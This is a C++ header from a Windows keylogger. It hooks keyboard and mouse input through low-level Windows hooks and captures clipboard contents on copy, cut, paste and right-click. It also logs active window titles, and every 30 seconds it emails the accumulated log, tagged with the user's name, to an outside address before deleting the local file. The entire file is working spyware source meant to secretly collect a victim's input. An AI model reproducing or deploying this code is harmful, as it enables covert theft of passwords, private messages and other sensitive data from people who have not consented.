#ifndef HOOKS_H
#define HOOKS_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeystrockesMap.h"
#include "Timer.h"
#include "MailScript.h"
#include <string>

#include <locale>
std::string keylog = "";


std::string GetClipboardText()
{
  // Try opening the clipboard
  if (! OpenClipboard(nullptr))
   return "";// error

  // Get handle of clipboard object for ANSI text
  HANDLE hData = GetClipboardData(CF_TEXT);
  if (hData == nullptr)
   return  "";// error

  // Lock the handle to get the actual text pointer
  char * pszText = static_cast<char*>( GlobalLock(hData) );
  if (pszText == nullptr)
    return  "";// error

  // Save text in a string class instance
  std::string text( pszText );
  // Release the lock
  GlobalUnlock( hData );

  // Release the clipboard
  CloseClipboard();

  return text ;


}

inline bool ends_with(std::string const & value, std::string const & ending)
{
    if (ending.size() > value.size()) return false;
    return std::equal(ending.rbegin(), ending.rend(), value.rbegin());
}

std::string GetWindowTitle()
{
    HWND handle = GetForegroundWindow();
    int bufsize = GetWindowTextLength(handle);
    std::basic_string<TCHAR>  title(bufsize, 0);
    GetWindowText(handle, &title[0], bufsize + 1);
    return title;
}

void TimerSendMail()
{
  if(keylog.empty())
        return;
  std::string last_file = IO::WriteLog(keylog);

  if(last_file.empty())
  {
      Auxiliary::WriteAppLog("File creation failed. Keylog'"+keylog + "'");
      return;
  }
  int x = Mail::SendMail( "Log: [" + last_file + "] " ,
                         "\r\nLog: [" + last_file + "] \nFrom: [" + IO::Get_UserName() + "] \nFor debugging: \r\n",
                         IO::GetOurPath(true) + last_file);
  if(x!=7)
  {
    Auxiliary::WriteAppLog("Mail was not sent! Error code: " + Auxiliary::ToString(x));
  }
  else
  {
    IO::RmDir(last_file);
    keylog = "";
  }
}



//set the timer to 15m or 900000 ms for debugging
Timer MailTimer(TimerSendMail, (30000), Timer::Infinite);

HHOOK eHook = NULL;
HHOOK mHook = NULL;
HHOOK wHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{

    if(nCode<0)
        CallNextHookEx(eHook, nCode, wparam, lparam);
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)
        {
            keylog += '\n';
        }

    }

    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL
           || key == VK_LCONTROL
           || key == VK_RCONTROL
           || key == VK_SHIFT
           || key == VK_LSHIFT
           || key == VK_RSHIFT
           || key == VK_MENU
           || key == VK_LMENU
           || key == VK_RMENU
           || key == VK_CAPITAL
           || key == VK_NUMLOCK
           || key == VK_LWIN
           || key == VK_RWIN )
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog +=KeyName;
        }
    }

    std::string StrCopy =  "[Left Ctrl][C][/Left Ctrl]";
    std::string StrCut =  "[Left Ctrl][X][/Left Ctrl]";
    std::string StrPaste =  "[Left Ctrl][V][/Left Ctrl]";
    std::string StrAltTab =  "[Tab][/Left Alt]";

    if(ends_with(keylog, StrCopy))
    {
        keylog += "\n [Copy] " + GetClipboardText() + " [/Copy] \n " ;
    }
    else if(ends_with(keylog, StrCut))
    {
        keylog += "\n [Cut] " + GetClipboardText() + " [/Cut] \n " ;
    }
    else if(ends_with(keylog, StrPaste))
    {
        keylog += "\n [Paste] " + GetClipboardText() + " [/Paste] \n " ;
    }
    else if(ends_with(keylog, StrAltTab))
    {
        keylog += "\n [Window Title: " + GetWindowTitle() + " ] ";
    }



    return CallNextHookEx(eHook, nCode, wparam, lparam);
}



LRESULT OurMouseProc(int nCode, WPARAM wparam, LPARAM lparam)
{

    if (nCode >= 0)
    {
        switch(wparam)
        {
            case WM_LBUTTONDOWN:
                 keylog += "\n[Lmouse]";
                break;

            case WM_LBUTTONUP:
                 keylog += " [/Lmouse] [Window Title: " + GetWindowTitle() + " ] ";
                break;

            case WM_RBUTTONDOWN:
                 keylog += "\n[Rmouse] ";
                break;

            case WM_RBUTTONUP:
                 keylog += "    [Clipboard " + GetClipboardText() + " ]  ";
                 keylog += " [/Rmouse] [Window Title: " + GetWindowTitle() + " ] ";
                break;

            case WM_MBUTTONDOWN:
                 keylog += "\n[Mmouse]";
                break;

            case WM_MBUTTONUP:
                 keylog += " [/Mmouse] [Window Title: " + GetWindowTitle() + " /] ";
                break;

            case WM_MOUSEWHEEL:
                 keylog += "\n[MouseWheel]";

        }
    }
    return CallNextHookEx(mHook, nCode, wparam, lparam);
}


bool InstallHook()
{

    Auxiliary::WriteAppLog("Hook Started... Timer started");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
                            GetModuleHandle(NULL), 0);
    mHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)OurMouseProc,
                             GetModuleHandle(NULL), 0);
    return eHook == NULL && mHook == NULL ;
}

bool UnistallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    BOOL c = UnhookWindowsHookEx(mHook);
    eHook = NULL;
    return (bool)b && (bool)c;
}

bool IsHooked()
{
    return (bool)(eHook == NULL && mHook == NULL);
}


#endif
